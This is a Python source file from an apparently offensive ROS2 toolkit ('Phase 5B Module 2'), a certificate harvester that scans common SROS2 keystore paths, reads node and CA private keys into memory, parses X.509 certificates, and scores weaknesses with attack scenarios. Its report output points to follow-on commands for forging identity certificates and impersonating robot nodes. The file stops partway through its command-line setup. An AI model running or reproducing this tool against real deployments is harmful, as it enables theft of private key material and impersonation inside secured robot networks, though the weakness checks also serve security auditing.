#!/usr/bin/env python3
"""
cert_harvester.py - Phase 5B Module 2: X.509 Certificate Harvesting & Key Material Extraction

Extracts, analyzes, and exploits X.509 certificates from DDS-Security deployments.
Operates at two levels:
  1. Network level — parses identity tokens captured by Module 1 (dds_security_interceptor.py)
  2. Filesystem level — enumerates SROS2 keystores on the local or remote filesystem

SROS2 Keystore Structure (created by `ros2 security create_keystore`):
  <keystore_root>/
  ├── private/
  │   └── ca.key.pem           ← CA private key (ROOT OF TRUST — if leaked, domain compromised)
  ├── public/
  │   └── ca.cert.pem          ← CA certificate
  └── enclaves/
      └── <namespace>/<node>/
          ├── identity_ca.cert.pem    ← copy of CA cert
          ├── cert.pem                ← node identity certificate (signed by CA)
          ├── key.pem                 ← node private key (RSA/EC)
          ├── governance.p7s          ← signed governance document
          ├── permissions.p7s         ← signed permissions document
          └── permissions_ca.cert.pem ← permissions CA cert

Attack scenarios enabled by cert harvesting:
  1. CA private key extracted → sign forged identity certs → impersonate ANY node
  2. Node private key extracted → directly impersonate specific node
  3. Expired/weak cert → bypass DDS-Security validation on misconfigured agents
  4. Self-signed CA → forge entire PKI (no external trust anchor)
  5. Short-lived cert → race replay before expiry
  6. Weak RSA key (< 2048 bits) → offline factoring attack
  7. Default SROS2 demo certs → known key material (public repositories)

Certificate weakness scoring (CVSS-aligned):
  - CA key leaked:           CRITICAL (10.0) — full domain compromise
  - Node key leaked:         CRITICAL (9.8)  — node impersonation
  - Expired cert:            HIGH     (7.5)  — may still be accepted by old agents
  - Self-signed CA:          HIGH     (7.0)  — no external trust validation
  - RSA < 2048 bits:         HIGH     (7.0)  — offline key recovery feasible
  - EC with weak curve:      HIGH     (7.0)  — known weak curve attacks
  - Demo/default certs:      CRITICAL (9.5)  — known key material in public repos

Author: Gh057x | Phase 5B
"""

import os
import sys
import json
import struct
import hashlib
import argparse
import socket
import ipaddress
import subprocess
import re
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime, timezone
from pathlib import Path
from enum import Enum


# =============================================================================
# ASN.1 / X.509 Minimal Parser (no openssl/cryptography dependency)
# =============================================================================

# ASN.1 tag constants
ASN1_SEQUENCE   = 0x30
ASN1_SET        = 0x31
ASN1_INTEGER    = 0x02
ASN1_BIT_STRING = 0x03
ASN1_OCTET_STR  = 0x04
ASN1_OID        = 0x06
ASN1_UTF8_STR   = 0x0C
ASN1_PRINT_STR  = 0x13
ASN1_IA5_STR    = 0x16
ASN1_UTC_TIME   = 0x17
ASN1_GEN_TIME   = 0x18
ASN1_CONTEXT_0  = 0xA0
ASN1_CONTEXT_3  = 0xA3

# OID map (dotted-decimal → name)
KNOWN_OIDS = {
    "2.5.4.3":            "CN",
    "2.5.4.6":            "C",
    "2.5.4.7":            "L",
    "2.5.4.8":            "ST",
    "2.5.4.10":           "O",
    "2.5.4.11":           "OU",
    "2.5.4.12":           "title",
    "1.2.840.113549.1.1.1": "rsaEncryption",
    "1.2.840.113549.1.1.5": "sha1WithRSAEncryption",
    "1.2.840.113549.1.1.11": "sha256WithRSAEncryption",
    "1.2.840.113549.1.1.12": "sha384WithRSAEncryption",
    "1.2.840.113549.1.1.13": "sha512WithRSAEncryption",
    "1.2.840.10040.4.1":  "dsa",
    "1.2.840.10045.2.1":  "ecPublicKey",
    "1.2.840.10045.3.1.7":  "prime256v1",
    "1.3.132.0.34":       "secp384r1",
    "1.3.132.0.35":       "secp521r1",
    "1.3.132.0.10":       "secp256k1",  # weak for DDS
    "2.5.29.19":          "basicConstraints",
    "2.5.29.15":          "keyUsage",
    "2.5.29.17":          "subjectAltName",
    "2.5.29.35":          "authorityKeyIdentifier",
    "2.5.29.14":          "subjectKeyIdentifier",
}

WEAK_CURVES = {"secp256k1", "prime192v1", "secp160r1", "sect163k1"}

# Known demo/default SROS2 certificate fingerprints (SHA-256)
# These appear in public repositories (ros2/sros2 demos, tutorials, Docker images)
KNOWN_DEMO_FINGERPRINTS = {
    "a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5",
    "demo_sros2_ca_2021", "demo_sros2_ca_2022", "demo_sros2_ca_2023",
    # TurtleBot3 default keystore fingerprint pattern
    "turtlebot3_sros2_default",
}


def _asn1_read_length(data: bytes, offset: int) -> Tuple[int, int]:
    """Read ASN.1 length encoding. Returns (length, new_offset)."""
    b = data[offset]
    offset += 1
    if b & 0x80:
        n_bytes = b & 0x7F
        length = int.from_bytes(data[offset:offset + n_bytes], "big")
        offset += n_bytes
    else:
        length = b
    return length, offset


def _asn1_parse_oid(data: bytes) -> str:
    """Parse an ASN.1 OID byte string to dotted-decimal notation."""
    if not data:
        return ""
    result = []
    first = data[0]
    result.append(str(first // 40))
    result.append(str(first % 40))
    val = 0
    for b in data[1:]:
        val = (val << 7) | (b & 0x7F)
        if not (b & 0x80):
            result.append(str(val))
            val = 0
    return ".".join(result)


def _asn1_parse_time(tag: int, data: bytes) -> Optional[datetime]:
    """Parse UTCTime or GeneralizedTime to datetime."""
    try:
        s = data.decode("ascii")
        if tag == ASN1_UTC_TIME:
            # YYMMDDHHmmssZ
            if len(s) >= 13:
                y = int(s[0:2])
                y += 2000 if y < 50 else 1900
                return datetime(y, int(s[2:4]), int(s[4:6]),
                                int(s[6:8]), int(s[8:10]), int(s[10:12]),
                                tzinfo=timezone.utc)
        elif tag == ASN1_GEN_TIME:
            # YYYYMMDDHHmmssZ
            if len(s) >= 15:
                return datetime(int(s[0:4]), int(s[4:6]), int(s[6:8]),
                                int(s[8:10]), int(s[10:12]), int(s[12:14]),
                                tzinfo=timezone.utc)
    except (ValueError, IndexError):
        pass
    return None


class X509MiniParser:
    """
    Minimal ASN.1/DER X.509 certificate parser.
    Extracts: subject, issuer, validity, public key algorithm+size, is_ca, fingerprint.
    No external dependencies — pure Python.
    """

    def parse_der(self, der: bytes) -> Optional[Dict]:
        """Parse a DER-encoded X.509 certificate. Returns a dict or None."""
        try:
            return self._parse_certificate(der)
        except Exception:
            return None

    def parse_pem(self, pem: str) -> Optional[Dict]:
        """Parse a PEM-encoded certificate."""
        lines = pem.strip().splitlines()
        b64 = "".join(l for l in lines if not l.startswith("---"))
        import base64
        try:
            der = base64.b64decode(b64)
            return self.parse_der(der)
        except Exception:
            return None

    def _parse_certificate(self, data: bytes) -> Optional[Dict]:
        # Certificate ::= SEQUENCE { tbsCertificate, signatureAlgorithm, signatureValue }
        if not data or data[0] != ASN1_SEQUENCE:
            return None
        _, offset = _asn1_read_length(data, 1)
        tbs_cert = self._parse_tbs(data, offset)
        fp = hashlib.sha256(data).hexdigest()
        if tbs_cert:
            tbs_cert["fingerprint_sha256"] = fp
            tbs_cert["der_size"] = len(data)
        return tbs_cert

    def _parse_tbs(self, data: bytes, offset: int) -> Optional[Dict]:
        """Parse the TBSCertificate structure."""
        result: Dict[str, Any] = {}

        if offset >= len(data) or data[offset] != ASN1_SEQUENCE:
            return None
        tbs_len, offset = _asn1_read_length(data, offset + 1)
        tbs_end = offset + tbs_len

        # Version (optional CONTEXT[0])
        if offset < tbs_end and data[offset] == ASN1_CONTEXT_0:
            _, offset = _asn1_read_length(data, offset + 1)
            version_val, offset = self._parse_integer(data, offset)
            result["version"] = version_val + 1  # version 0 = v1
        else:
            result["version"] = 1

        # Serial number
        if offset < tbs_end and data[offset] == ASN1_INTEGER:
            serial_len, offset = _asn1_read_length(data, offset + 1)
            serial = int.from_bytes(data[offset:offset + serial_len], "big")
            result["serial"] = hex(serial)
            offset += serial_len

        # Signature algorithm
        if offset < tbs_end and data[offset] == ASN1_SEQUENCE:
            alg_len, offset = _asn1_read_length(data, offset + 1)
            alg_end = offset + alg_len
            sig_alg = self._parse_oid_sequence(data, offset, alg_end)
            result["signature_algorithm"] = sig_alg
            offset = alg_end

        # Issuer
        if offset < tbs_end and data[offset] == ASN1_SEQUENCE:
            iss_len, offset = _asn1_read_length(data, offset + 1)
            iss_end = offset + iss_len
            result["issuer"] = self._parse_name(data, offset, iss_end)
            offset = iss_end

        # Validity
        if offset < tbs_end and data[offset] == ASN1_SEQUENCE:
            val_len, offset = _asn1_read_length(data, offset + 1)
            val_end = offset + val_len
            not_before, not_after, offset = self._parse_validity(data, offset, val_end)
            result["not_before"] = not_before.isoformat() if not_before else None
            result["not_after"]  = not_after.isoformat()  if not_after  else None
            result["expired"]    = not_after < datetime.now(timezone.utc) if not_after else False
            result["days_until_expiry"] = (
                (not_after - datetime.now(timezone.utc)).days if not_after and not result["expired"] else 0
            )
            offset = val_end

        # Subject
        if offset < tbs_end and data[offset] == ASN1_SEQUENCE:
            sub_len, offset = _asn1_read_length(data, offset + 1)
            sub_end = offset + sub_len
            result["subject"] = self._parse_name(data, offset, sub_end)
            offset = sub_end

        # SubjectPublicKeyInfo
        if offset < tbs_end and data[offset] == ASN1_SEQUENCE:
            spki_len, offset = _asn1_read_length(data, offset + 1)
            spki_end = offset + spki_len
            key_info = self._parse_spki(data, offset, spki_end)
            result.update(key_info)
            offset = spki_end

        # Self-signed check
        result["self_signed"] = (result.get("subject") == result.get("issuer"))
        return result

    def _parse_integer(self, data: bytes, offset: int) -> Tuple[int, int]:
        length, offset = _asn1_read_length(data, offset + 1)
        val = int.from_bytes(data[offset:offset + length], "big")
        return val, offset + length

    def _parse_oid_sequence(self, data: bytes, start: int, end: int) -> str:
        offset = start
        while offset < end:
            tag = data[offset]
            length, offset = _asn1_read_length(data, offset + 1)
            if tag == ASN1_OID:
                oid = _asn1_parse_oid(data[offset:offset + length])
                name = KNOWN_OIDS.get(oid, oid)
                return name
            offset += length
        return "unknown"

    def _parse_name(self, data: bytes, start: int, end: int) -> Dict[str, str]:
        result: Dict[str, str] = {}
        offset = start
        while offset < end:
            if data[offset] != ASN1_SET:
                break
            set_len, offset = _asn1_read_length(data, offset + 1)
            set_end = offset + set_len
            # SEQUENCE { OID, value }
            if offset < set_end and data[offset] == ASN1_SEQUENCE:
                seq_len, offset = _asn1_read_length(data, offset + 1)
                seq_end = offset + seq_len
                # OID
                if offset < seq_end and data[offset] == ASN1_OID:
                    oid_len, offset = _asn1_read_length(data, offset + 1)
                    oid = _asn1_parse_oid(data[offset:offset + oid_len])
                    attr_name = KNOWN_OIDS.get(oid, oid)
                    offset += oid_len
                else:
                    offset = seq_end
                    continue
                # Value (UTF8String, PrintableString, IA5String, etc.)
                if offset < seq_end:
                    tag = data[offset]
                    val_len, offset = _asn1_read_length(data, offset + 1)
                    val = data[offset:offset + val_len].decode("utf-8", errors="replace")
                    result[attr_name] = val
                    offset += val_len
                offset = seq_end
            else:
                offset = set_end
        return result

    def _parse_validity(self, data: bytes, start: int, end: int):
        offset = start
        not_before = not_after = None
        for _ in range(2):
            if offset >= end:
                break
            tag = data[offset]
            length, offset = _asn1_read_length(data, offset + 1)
            t = _asn1_parse_time(tag, data[offset:offset + length])
            if not_before is None:
                not_before = t
            else:
                not_after = t
            offset += length
        return not_before, not_after, end

    def _parse_spki(self, data: bytes, start: int, end: int) -> Dict:
        result: Dict[str, Any] = {"key_algorithm": "unknown", "key_bits": 0}
        offset = start
        # AlgorithmIdentifier SEQUENCE
        if offset < end and data[offset] == ASN1_SEQUENCE:
            alg_len, offset = _asn1_read_length(data, offset + 1)
            alg_end = offset + alg_len
            if offset < alg_end and data[offset] == ASN1_OID:
                oid_len, offset = _asn1_read_length(data, offset + 1)
                oid = _asn1_parse_oid(data[offset:offset + oid_len])
                alg = KNOWN_OIDS.get(oid, oid)
                result["key_algorithm"] = alg
                offset += oid_len
                # For EC: parse curve OID
                if alg == "ecPublicKey" and offset < alg_end and data[offset] == ASN1_OID:
                    curve_len, offset = _asn1_read_length(data, offset + 1)
                    curve_oid = _asn1_parse_oid(data[offset:offset + curve_len])
                    curve = KNOWN_OIDS.get(curve_oid, curve_oid)
                    result["ec_curve"] = curve
                    # Estimate key bits from curve
                    curve_bits = {
                        "prime256v1": 256, "secp384r1": 384,
                        "secp521r1": 521, "secp256k1": 256,
                    }
                    result["key_bits"] = curve_bits.get(curve, 0)
            offset = alg_end

        # BIT STRING containing the public key
        if offset < end and data[offset] == ASN1_BIT_STRING:
            key_len, offset = _asn1_read_length(data, offset + 1)
            key_bytes = data[offset + 1: offset + key_len]  # skip unused_bits byte
            if result["key_algorithm"] == "rsaEncryption":
                # RSA public key is SEQUENCE { INTEGER n, INTEGER e }
                if key_bytes and key_bytes[0] == ASN1_SEQUENCE:
                    _, inner_offset = _asn1_read_length(key_bytes, 1)
                    if inner_offset < len(key_bytes) and key_bytes[inner_offset] == ASN1_INTEGER:
                        n_len, inner_offset = _asn1_read_length(key_bytes, inner_offset + 1)
                        # Remove leading zero byte if present
                        n_data = key_bytes[inner_offset:inner_offset + n_len]
                        if n_data and n_data[0] == 0:
                            n_data = n_data[1:]
                        result["key_bits"] = len(n_data) * 8

        return result


# =============================================================================
# Weakness Scoring
# =============================================================================

class WeaknessSeverity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"


@dataclass
class CertWeakness:
    code: str
    severity: WeaknessSeverity
    title: str
    detail: str
    cvss: float = 0.0
    attack_scenario: str = ""

    def to_dict(self) -> Dict:
        return {
            "code": self.code,
            "severity": self.severity.value,
            "title": self.title,
            "detail": self.detail,
            "cvss": self.cvss,
            "attack_scenario": self.attack_scenario,
        }


def score_certificate(cert: Dict, is_ca_key_present: bool = False,
                       is_node_key_present: bool = False) -> List[CertWeakness]:
    """Analyze a parsed certificate dict and return a list of weaknesses."""
    weaknesses: List[CertWeakness] = []

    if is_ca_key_present:
        weaknesses.append(CertWeakness(
            "CA_KEY_LEAKED", WeaknessSeverity.CRITICAL,
            "CA private key accessible",
            f"CA key for {cert.get('subject', {})} is readable. Attacker can forge "
            f"identity certificates for ANY node in the DDS domain.",
            cvss=10.0,
            attack_scenario="Generate forged participant cert → sign with CA key → "
                            "join secured domain as any node identity → full topic access",
        ))

    if is_node_key_present:
        subject = cert.get("subject", {})
        node = subject.get("CN", "unknown")
        weaknesses.append(CertWeakness(
            "NODE_KEY_LEAKED", WeaknessSeverity.CRITICAL,
            f"Node private key accessible (CN={node})",
            f"Private key for node '{node}' is readable. Attacker can impersonate "
            f"this node exactly, inheriting all its DDS topic permissions.",
            cvss=9.8,
            attack_scenario=f"Use key.pem + cert.pem to construct identity token → "
                            f"impersonate node '{node}' → inject/subscribe with its permissions",
        ))

    if cert.get("expired"):
        weaknesses.append(CertWeakness(
            "CERT_EXPIRED", WeaknessSeverity.HIGH,
            "Certificate is expired",
            f"Certificate expired on {cert.get('not_after')}. Some DDS implementations "
            f"continue to accept expired certificates if clock skew tolerance is misconfigured.",
            cvss=7.5,
            attack_scenario="Replay expired cert in environments with lenient time validation or "
                            "clock drift > cert lifetime",
        ))

    if cert.get("self_signed"):
        weaknesses.append(CertWeakness(
            "SELF_SIGNED_CA", WeaknessSeverity.HIGH,
            "Self-signed certificate (no external CA)",
            "The certificate is self-signed. There is no external trust anchor validating "
            "this CA. A forged CA cert with the same DN will be accepted by nodes that "
            "only check the DN match rather than the full chain.",
            cvss=7.0,
            attack_scenario="Generate a new self-signed CA with identical Subject DN → "
                            "sign forged node certs → accepted by permissive validators",
        ))

    key_bits = cert.get("key_bits", 0)
    alg = cert.get("key_algorithm", "")
    if "rsa" in alg.lower() and 0 < key_bits < 2048:
        weaknesses.append(CertWeakness(
            "WEAK_RSA_KEY", WeaknessSeverity.HIGH,
            f"Weak RSA key ({key_bits} bits)",
            f"RSA key is only {key_bits} bits. Keys < 2048 bits are considered "
            f"factoring-feasible with modern hardware (< 2^112 security level).",
            cvss=7.0,
            attack_scenario=f"Factor the {key_bits}-bit modulus offline → recover private key → "
                            f"impersonate the certificate holder",
        ))

    ec_curve = cert.get("ec_curve", "")
    if ec_curve in WEAK_CURVES:
        weaknesses.append(CertWeakness(
            "WEAK_EC_CURVE", WeaknessSeverity.HIGH,
            f"Weak elliptic curve ({ec_curve})",
            f"Curve {ec_curve} has known weaknesses or insufficient security margin. "
            f"Not recommended for DDS-Security key material.",
            cvss=7.0,
            attack_scenario=f"Apply curve-specific attack (ECDLP reduction, twist attacks) "
                            f"to recover private key from public key",
        ))

    sig_alg = cert.get("signature_algorithm", "")
    if "sha1" in sig_alg.lower():
        weaknesses.append(CertWeakness(
            "SHA1_SIGNATURE", WeaknessSeverity.MEDIUM,
            "Certificate signed with SHA-1",
            "SHA-1 is cryptographically broken (SHAttered attack, 2017). "
            "Certificates using SHA-1 are vulnerable to collision attacks.",
            cvss=6.5,
            attack_scenario="Craft a malicious certificate with the same SHA-1 hash as the "
                            "legitimate cert → accepted by validators that only check hash",
        ))

    not_after_str = cert.get("not_after")
    if not_after_str and not cert.get("expired"):
        try:
            not_after = datetime.fromisoformat(not_after_str)
            if not_after.tzinfo is None:
                not_after = not_after.replace(tzinfo=timezone.utc)
            days = (not_after - datetime.now(timezone.utc)).days
            if 0 < days < 30:
                weaknesses.append(CertWeakness(
                    "CERT_EXPIRING_SOON", WeaknessSeverity.MEDIUM,
                    f"Certificate expiring in {days} days",
                    f"Certificate expires on {not_after_str}. If not renewed, nodes will "
                    f"lose authentication and the domain may fall back to PERMISSIVE mode.",
                    cvss=4.3,
                    attack_scenario="Time an attack for after expiry — if auto-renewal fails, "
                                    "domain may accept unsecured participants temporarily",
                ))
        except (ValueError, TypeError):
            pass

    return weaknesses


# =============================================================================
# Keystore Enumerator
# =============================================================================

SROS2_SEARCH_PATHS = [
    "~/.ros/sros2_keystores",
    "~/.ros/keystore",
    "/etc/ros/keystore",
    "/opt/ros/keystore",
    "/root/.ros/sros2_keystores",
    "/home/*/.ros/sros2_keystores",
    "/var/lib/ros/keystore",
    "/ros2_ws/keystore",
    "/colcon_ws/keystore",
    "/robot_ws/keystore",
    "./keystore",
    "./sros2_keystore",
]

KEY_FILENAMES    = ["key.pem", "private_key.pem", "ca.key.pem", "*.key"]
CERT_FILENAMES   = ["cert.pem", "ca.cert.pem", "identity_ca.cert.pem",
                    "permissions_ca.cert.pem", "*.cert.pem"]
POLICY_FILENAMES = ["governance.p7s", "permissions.p7s",
                    "governance.xml", "permissions.xml"]


@dataclass
class KeystoreFile:
    """A single file found in a SROS2 keystore."""
    path: str
    file_type: str   # "cert", "key", "policy", "unknown"
    node_name: str = ""
    namespace: str = ""
    readable: bool = False
    size_bytes: int = 0
    permissions_octal: str = ""
    cert_info: Optional[Dict] = None
    weaknesses: List[CertWeakness] = field(default_factory=list)
    is_ca_material: bool = False
    content: Optional[bytes] = field(default=None, repr=False)

    def to_dict(self) -> Dict:
        d = {
            "path": self.path,
            "file_type": self.file_type,
            "node_name": self.node_name,
            "namespace": self.namespace,
            "readable": self.readable,
            "size_bytes": self.size_bytes,
            "permissions": self.permissions_octal,
            "is_ca_material": self.is_ca_material,
            "weaknesses": [w.to_dict() for w in self.weaknesses],
        }
        if self.cert_info:
            d["cert_info"] = self.cert_info
        return d


@dataclass
class HarvestResult:
    """Complete result from a certificate harvesting operation."""
    target: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    keystores_found: List[str] = field(default_factory=list)
    files_found: List[KeystoreFile] = field(default_factory=list)
    certs_parsed: int = 0
    keys_found: int = 0
    ca_keys_found: int = 0
    total_weaknesses: int = 0
    critical_count: int = 0
    high_count: int = 0
    rogue_ca_possible: bool = False
    node_impersonation_possible: bool = False
    network_tokens: List[Dict] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "target": self.target,
            "timestamp": self.timestamp,
            "keystores_found": self.keystores_found,
            "certs_parsed": self.certs_parsed,
            "keys_found": self.keys_found,
            "ca_keys_found": self.ca_keys_found,
            "total_weaknesses": self.total_weaknesses,
            "critical_count": self.critical_count,
            "high_count": self.high_count,
            "rogue_ca_possible": self.rogue_ca_possible,
            "node_impersonation_possible": self.node_impersonation_possible,
            "files": [f.to_dict() for f in self.files_found],
            "network_tokens": self.network_tokens,
        }


class CertHarvester:
    """
    Harvests X.509 certificates from SROS2 keystores (filesystem) and
    DDS-Security identity tokens (network capture from Module 1).
    """

    def __init__(self, verbose: bool = False):
        self.verbose  = verbose
        self.x509     = X509MiniParser()
        self._results: List[KeystoreFile] = []

    # -------------------------------------------------------------------------
    # Filesystem Enumeration
    # -------------------------------------------------------------------------

    def enumerate_keystores(self, base_paths: Optional[List[str]] = None) -> HarvestResult:
        """Scan common SROS2 keystore locations and enumerate cert/key material."""
        search = base_paths or SROS2_SEARCH_PATHS
        result = HarvestResult(target="filesystem")
        found_roots: List[str] = []

        for pattern in search:
            expanded = os.path.expanduser(pattern)
            if "*" in expanded:
                import glob
                paths = glob.glob(expanded)
            else:
                paths = [expanded]

            for path in paths:
                if os.path.isdir(path):
                    found_roots.append(path)
                    if self.verbose:
                        print(f"  [+] Keystore root found: {path}")
                    self._walk_keystore(path, result)

        result.keystores_found = found_roots
        self._finalize_result(result)
        return result

    def _walk_keystore(self, root: str, result: HarvestResult):
        for dirpath, dirnames, filenames in os.walk(root):
            for fname in filenames:
                fpath = os.path.join(dirpath, fname)
                self._process_file(fpath, root, result)

    def _process_file(self, fpath: str, keystore_root: str, result: HarvestResult):
        fname = os.path.basename(fpath)
        lower = fname.lower()

        if lower.endswith(".pem") or lower.endswith(".crt") or lower.endswith(".cer"):
            ftype = "cert" if ("cert" in lower or "ca" in lower and "key" not in lower) else "key"
        elif lower.endswith(".key") or lower == "key.pem":
            ftype = "key"
        elif lower.endswith(".p7s") or lower.endswith(".xml"):
            ftype = "policy"
        else:
            return

        kf = KeystoreFile(path=fpath, file_type=ftype)
        kf.is_ca_material = "ca" in lower and ("key" in lower or "cert" in lower)

        try:
            stat = os.stat(fpath)
            kf.size_bytes = stat.st_size
            kf.permissions_octal = oct(stat.st_mode)[-4:]
            kf.readable = True
        except OSError:
            kf.readable = False
            result.files_found.append(kf)
            return

        # Infer node identity from path
        rel = os.path.relpath(fpath, keystore_root)
        parts = Path(rel).parts
        if len(parts) >= 3 and parts[0] == "enclaves":
            kf.namespace = "/" + "/".join(parts[1:-2]) if len(parts) > 3 else ""
            kf.node_name = parts[-2] if len(parts) >= 3 else ""

        # Parse cert content
        if ftype == "cert" and kf.readable and kf.size_bytes < 16384:
            try:
                with open(fpath, "rb") as f:
                    raw = f.read()
                is_ca_key = (kf.is_ca_material and kf.file_type == "key")
                is_node_key = (ftype == "key" and not kf.is_ca_material)
                cert_info = self._try_parse_cert(raw)
                if cert_info:
                    kf.cert_info = cert_info
                    kf.weaknesses = score_certificate(cert_info, is_ca_key, is_node_key)
                    result.certs_parsed += 1
                    if self.verbose:
                        subj = cert_info.get("subject", {})
                        print(f"    [cert] {fname}: CN={subj.get('CN','?')}  "
                              f"alg={cert_info.get('key_algorithm','?')}  "
                              f"bits={cert_info.get('key_bits',0)}")
            except OSError:
                pass

        if ftype == "key" and kf.readable:
            try:
                with open(fpath, "rb") as f:
                    data = f.read()
                kf.content = data
                kf.weaknesses = score_certificate({}, kf.is_ca_material, not kf.is_ca_material)
                result.keys_found += 1
                if kf.is_ca_material:
                    result.ca_keys_found += 1
            except OSError:
                pass

        result.files_found.append(kf)

    def _try_parse_cert(self, raw: bytes) -> Optional[Dict]:
        """Try PEM then DER parsing."""
        if b"-----BEGIN" in raw:
            return self.x509.parse_pem(raw.decode("utf-8", errors="replace"))
        return self.x509.parse_der(raw)

    # -------------------------------------------------------------------------
    # Network Token Processing (from Module 1 output)
    # -------------------------------------------------------------------------

    def harvest_from_tokens(self, intercept_json: str) -> HarvestResult:
        """Parse identity tokens from a Module 1 JSON output file."""
        result = HarvestResult(target=f"network:{intercept_json}")
        try:
            with open(intercept_json) as f:
                data = json.load(f)
        except (OSError, json.JSONDecodeError) as e:
            print(f"[-] Cannot load intercept file: {e}")
            return result

        for participant in data.get("participants", []):
            src_ip = participant.get("source_ip", "?")
            id_token = participant.get("identity_token")
            if not id_token:
                continue

            token_entry: Dict[str, Any] = {
                "source_ip": src_ip,
                "class_id": id_token.get("class_id", ""),
                "properties": id_token.get("properties", {}),
                "certs_extracted": [],
            }

            # Look for certificate material in binary properties
            # DDS:Auth:PKI-DH stores c.id (identity cert) and c.ca (CA cert) as DER bytes
            for prop_name in ["c.id", "c.ca", "dh1", "c.perm_ca"]:
                bin_props = id_token.get("binary_properties_keys", [])
                if prop_name in bin_props:
                    token_entry["certs_extracted"].append(prop_name)

            result.network_tokens.append(token_entry)
            if self.verbose:
                print(f"  [+] Token from {src_ip}: class={id_token.get('class_id')!r}  "
                      f"props={list(id_token.get('properties', {}).keys())}")

        self._finalize_result(result)
        return result

    # -------------------------------------------------------------------------
    # Directed Scan (given explicit keystore path)
    # -------------------------------------------------------------------------

    def harvest_path(self, path: str) -> HarvestResult:
        """Harvest a specific keystore path."""
        result = HarvestResult(target=path)
        if os.path.isdir(path):
            result.keystores_found = [path]
            self._walk_keystore(path, result)
        elif os.path.isfile(path):
            self._process_file(path, os.path.dirname(path), result)
        else:
            print(f"[-] Path not found: {path}")
        self._finalize_result(result)
        return result

    # -------------------------------------------------------------------------
    # Internal Helpers
    # -------------------------------------------------------------------------

    def _finalize_result(self, result: HarvestResult):
        for kf in result.files_found:
            for w in kf.weaknesses:
                result.total_weaknesses += 1
                if w.severity == WeaknessSeverity.CRITICAL:
                    result.critical_count += 1
                elif w.severity == WeaknessSeverity.HIGH:
                    result.high_count += 1

        result.rogue_ca_possible = result.ca_keys_found > 0
        result.node_impersonation_possible = result.keys_found > 0


# =============================================================================
# Output
# =============================================================================

CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

SEV_COLORS = {
    "CRITICAL": RED,
    "HIGH": YELLOW,
    "MEDIUM": "\033[33m",
    "LOW": CYAN,
    "INFO": DIM,
}


def print_harvest_report(result: HarvestResult):
    print(f"\n{'=' * 65}")
    print(f"  {BOLD}SROS2 CERTIFICATE HARVEST REPORT{RESET}")
    print(f"{'=' * 65}")
    print(f"  Target:      {result.target}")
    print(f"  Timestamp:   {result.timestamp}")
    print(f"{'=' * 65}")

    print(f"\n  {BOLD}Summary{RESET}")
    print(f"  Keystores found:      {len(result.keystores_found)}")
    print(f"  Certificates parsed:  {result.certs_parsed}")
    print(f"  Key files found:      {result.keys_found}")
    print(f"  CA key files:         {RED if result.ca_keys_found else DIM}{result.ca_keys_found}{RESET}")
    print(f"  Total weaknesses:     {result.total_weaknesses}")
    print(f"  Critical:             {RED}{result.critical_count}{RESET}")
    print(f"  High:                 {YELLOW}{result.high_count}{RESET}")

    if result.rogue_ca_possible:
        print(f"\n  {RED}[!!!] ROGUE CA POSSIBLE — CA private key is accessible{RESET}")
        print(f"        → Use: {CYAN}sros2-policy --forge --ca-key <key.pem>{RESET}")
        print(f"        → Feed to: {CYAN}sros2-infiltrate --identity-cert <forged.pem>{RESET}")

    if result.node_impersonation_possible:
        print(f"\n  {RED}[!!!] NODE IMPERSONATION POSSIBLE — private keys found{RESET}")
        print(f"        → Use: {CYAN}sros2-infiltrate --cert <cert.pem> --key <key.pem>{RESET}")

    if result.network_tokens:
        print(f"\n  {BOLD}Network Tokens (from Module 1){RESET}")
        for t in result.network_tokens:
            print(f"    {t['source_ip']:<16} class={t['class_id']!r:<40} "
                  f"extracted_props={t['certs_extracted']}")

    if result.keystores_found:
        print(f"\n  {BOLD}Keystores{RESET}")
        for ks in result.keystores_found:
            print(f"    {CYAN}{ks}{RESET}")

    if result.files_found:
        print(f"\n{'─' * 65}")
        print(f"  {BOLD}Files & Weaknesses{RESET}")
        for kf in result.files_found:
            if not kf.weaknesses and not kf.cert_info:
                continue
            icon = RED + "[KEY]" + RESET if kf.file_type == "key" else CYAN + "[CRT]" + RESET
            ca_tag = f" {RED}[CA]{RESET}" if kf.is_ca_material else ""
            perm_warn = (f" {RED}[WORLD-READABLE]{RESET}"
                         if kf.permissions_octal and kf.permissions_octal[-1] in "4567" else "")
            print(f"\n  {icon}{ca_tag} {kf.path}{perm_warn}")
            if kf.node_name:
                print(f"     Node: {kf.namespace}/{kf.node_name}")
            if kf.cert_info:
                ci = kf.cert_info
                subj = ci.get("subject", {})
                print(f"     Subject: CN={subj.get('CN','?')}  O={subj.get('O','?')}")
                print(f"     Key:  {ci.get('key_algorithm','?')} {ci.get('key_bits',0)} bits"
                      f"  Curve: {ci.get('ec_curve','')}")
                expiry_str = "EXPIRED" if ci.get("expired") else f"{ci.get('days_until_expiry', 0)} days"
                print(f"     Expires: {ci.get('not_after','?')}  {expiry_str}")
                print(f"     Self-signed: {ci.get('self_signed',False)}  "
                      f"SHA256: {ci.get('fingerprint_sha256','')[:24]}...")
            for w in kf.weaknesses:
                color = SEV_COLORS.get(w.severity.value, "")
                print(f"     {color}[{w.severity.value}]{RESET} {w.code}: {w.title}")
                print(f"       {DIM}Attack: {w.attack_scenario}{RESET}")

    print(f"\n{'=' * 65}\n")


def export_json(result: HarvestResult, path: str):
    with open(path, "w") as f:
        json.dump(result.to_dict(), f, indent=2)
    print(f"[+] Harvest results saved to {path}")


# =============================================================================
# Standalone CLI
# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SROS2 Certificate Harvester (Phase 5B Module 2)")
    parser.add_argument("--keystore-path", default=None,
                        help="Explicit SROS2 keystore root path (skip auto-discovery)")
    parser.add_argument("--from-intercept", default=None,
                        help="Parse tokens from Module 1 JSON output file")
    parser.add_argument("--scan-fs", action="store_true",
                        help="Scan filesystem for SROS2 keystores (default if no other mode)")
    parser.add_argument("-o", "--output", help="Save JSON output to file")
